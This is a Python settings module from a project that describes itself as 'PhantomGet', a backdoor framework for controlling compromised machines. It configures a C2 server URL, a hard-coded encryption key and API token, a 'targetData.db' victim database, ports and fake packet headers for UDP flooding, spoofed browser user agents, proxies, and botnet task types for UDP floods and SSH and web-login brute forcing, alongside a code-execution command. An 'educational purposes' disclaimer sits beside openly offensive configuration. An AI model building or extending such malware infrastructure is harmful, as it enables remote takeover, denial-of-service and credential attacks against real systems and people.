# Copyright (c) 2025 Omer Kemal
# Proprietary and confidential. All rights reserved.
# Unauthorized copying, modification, or distribution is prohibited.
"""
PhantomGet - A backdoor framework for remote control and management of compromised systems.
This code is part of the PhantomGet project, which is designed to provide a backdoor functionality
for remote access and control over compromised machines. It includes features for command execution,
data retrieval, and system management through a web interface.
This file contains the Setting class, which is responsible for managing application settings,
including paths for logs and database, instruction types, statuses, and network-related configurations.
It also provides utility methods for generating random identifiers.
This code is intended for educational purposes only and should not be used for malicious activities.
Copyright (c) 2023 GhostTrigger(SpecterPanel) Team
Licensed under the GNU General Public License v3.0 (GPL-3.0)
"""

import os
from datetime import datetime
import secrets
import string


class Setting:
    """
    The Setting class is responsible for storing application settings and
    providing utility methods for generating random identifiers,
    and managing configuration paths and database details.
    """

    def setting_var(self):
        """
        Initializes the settings for the application, including paths for
        logs and database, as well as instruction types and statuses.
        This method sets up the necessary configuration for the application
        to function correctly.
        It defines the following attributes:
            - LOG_DIR: Directory path for logs
            - LOG_FILE_NAME: Name of the log file
            - LOG_FILE_PATH: Full path to the log file
            - DB_NAME: Name of the database file
            - DB_DIR: Directory where the database is stored
            - DB_URI: URI for the database connection
            - INSTRUCTION: List of instruction types
            - STUTAS: List of statuses for the application
            - BUIT_IN_COMMAND: List of built-in commands
            - API_TOKEN: Token for API authentication
        It also initializes various network-related settings such as:
            - PORT: List of common ports used for various protocols
            - FAKE_HEADERS: List of fake headers for network requests
            - BASE_DELAY: Base delay for network operations
            - MAX_DELAY: Maximum delay for network operations
            - MIN_DELAY: Minimum delay for network operations
            - ADAPTIVE_THRESHOLD: Threshold for adapting delay based on request count
        The method does not return any value but sets up the instance variables
        that can be accessed throughout the application. It is typically called
        during the initialization of the application to ensure that all settings
        are configured before any operations are performed.
        This method does not take any parameters and does not return any value.
        """

        # AES key for encryption
        self.ENCRYPTION_KEY = b'W\xb7a\xab\xf7\xd9\xd2\xf0\x8b\xcb\xea\xc3\x93G\xbdS'  # get_random_bytes(16)

        # --- Base Directory Setup ---
        BASE_DIR = os.path.dirname(os.path.abspath(__file__))  # folder where this config file lives

        # --- Log Configuration ---
        self.LOG_DIR = os.path.join(BASE_DIR, "utility", "log")
        os.makedirs(self.LOG_DIR, exist_ok=True)

        self.LOG_FILE_NAME = "log.txt"
        self.LOG_FILE_PATH = os.path.join(self.LOG_DIR, self.LOG_FILE_NAME)

        # --- Database Configuration ---
        self.DB_NAME = "targetData.db"
        self.DB_DIR = os.path.join(BASE_DIR, "db")
        os.makedirs(self.DB_DIR, exist_ok=True)

        # Always use absolute path for SQLite
        self.DB_URI = os.path.join(self.DB_DIR, self.DB_NAME)

        # --- C2 Server Link ---
        # test server link, change to your actual C2 server URL
        # self.url = 'http://127.0.0.1:5000'
        # self.url = 'http://www.oh-tool-v2.onrender.com'
        self.url = "https://omerk.pythonanywhere.com"

        # --- Application Path ---
        # NOTE: This is Windows-specific and may not be valid on Linux
        # self.APP_PATH = r"C:\full\app\path\PhantomGate.exe"  # make the app name like sys_config,systemBackup...

        # --- Network & UDP Config ---
        self.PORT = [
            21,  # FTP
            22,  # SSH
            23,  # Telnet
            25,  # SMTP
            53,  # DNS(UDP)
            80,  # HTTP
            110,  # POP3
            123,  # NTP(UDP)
            143,  # IMAP
            161,  # SNMP(UDP)
            443,  # HTTPS
            445,  # SMB
            993,  # IMAPS
            995,  # POP3S
            3389,  # RDP
            5060,  # SIP(VoIP)
            8080,  # Alternative HTTP
        ]
        self.FAKE_HEADERS = [
            b"\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00",  # DNS-like query
            b"\x80\x00\x00\x00\x00\x01\x00\x00\x00\x00",  # VoIP RTP header
            b"\x00\x00\x00\x00\x00\x00\x00\x00",  # Generic header
        ]
        self.BASE_DELAY = 0.01
        self.MAX_DELAY = 0.1
        self.MIN_DELAY = 0.05
        self.ADAPTIVE_THRESHOLD = 100  # Number of requests before adapting delay

        # --- Request Configuration ---
        self.USER_AGENTS = [
            # Chrome on Windows
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",

            # Firefox on Linux
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",

            # Safari on macOS
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
            "(KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",

            # Android Chrome
            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",

            # iPhone Safari
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 "
            "(KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
        ]
        self.PROXIES = [
            # Example: 'http://user:pass@ip:port'
            'http://123.45.67.89:8080',
            'http://98.76.54.32:3128',
        ]

        # --- App Settings ---
        self.INSTRUCTION = ['connectToWeb', 'connectBySocket', 'BotNet']
        self.STATUS = ['Active', 'Inactive']
        self.BUILT_IN_COMMAND = ['lib', 'server', 'excute_code', 'sys_info','bot','db_info']
        self.INSTRACTION_BOTNET_CATEGORY = ['udp-flood','bruteForce']
        self.BOT_CATEGORY = ['udp-flood','ssh','web-login']

        # API token
        self.API_TOKEN = 'zRVqTf2kRYAWlyZhcPgrM9mWWue1DOjW2lPEVPb1n0y74B6pikeIS0M21iusVti2f2yyLyk9weu2Dgjpv0xy63mWpikYSMbAWm0gSL0TAXWsFIDeWVdVrOtdiLp4icOrJjFZjy5NnxUKeGcX1yQimQBg4L3CkK38hU5ZPbI2lcB8PI3ZbPaB6RPJZyE3ki4PAHPWYZKq'

        self.MAIN_LOOP_DELAY = 15

    def ID(self, n=5):
        """
        Generates a random alphanumeric ID of length n (default 5).
        This ID can be used for creating unique identifiers for entities
        in the system, such as users, events, or records.
        """
        return ''.join(
            secrets.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits)
            for _ in range(n)
        )
